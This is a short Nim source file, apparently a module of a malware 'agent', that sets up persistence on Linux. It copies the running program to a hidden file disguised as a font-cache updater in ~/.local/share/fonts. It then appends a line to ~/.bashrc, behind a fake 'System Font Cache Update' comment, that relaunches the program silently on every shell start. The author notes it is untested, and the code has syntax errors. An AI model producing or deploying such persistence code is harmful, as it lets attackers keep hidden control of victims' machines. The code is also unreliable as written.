import std/[os, osproc]
import process
#If you think you can get away with this just because you use Linux, you're wrong.
proc linuxPersistence
let currentApp = getAppFilename()
let homeDir = getHomeDir()
let targetDir = homeDir / ".local/share/fonts"
let targetApp = targetDir / ".font-cache-gnu-update"
let bashrcPath = homeDir / ".bashrc"
if currentApp != targetApp :
  if not dirExists(targetDir)
    createDir(targetDir)
  copyFile(currentApp, targetApp)
  setFilePermissions(targetApp,{fpUserRead,fpUserWrite,fpUserExec})
if fileExists(bashrcPath)
  let bashrcContent = readFile(bashrcPath)
  let payloadTerminal = "(" & targetApp & " >/dev/null 2>&1 &) disown"
  if not bashrcContent.contains(targetApp):
    var f = open(bashrcPath, fmAppend)
    f.writeLine("\n# System Font Cache Update .")
    f.writeLine(payloadTerminal)
    f.close()
#Note: There's a chance this won't work. Actually, there's a chance none of them will work. I haven't tested any of them yet. I need to get this agent up and running.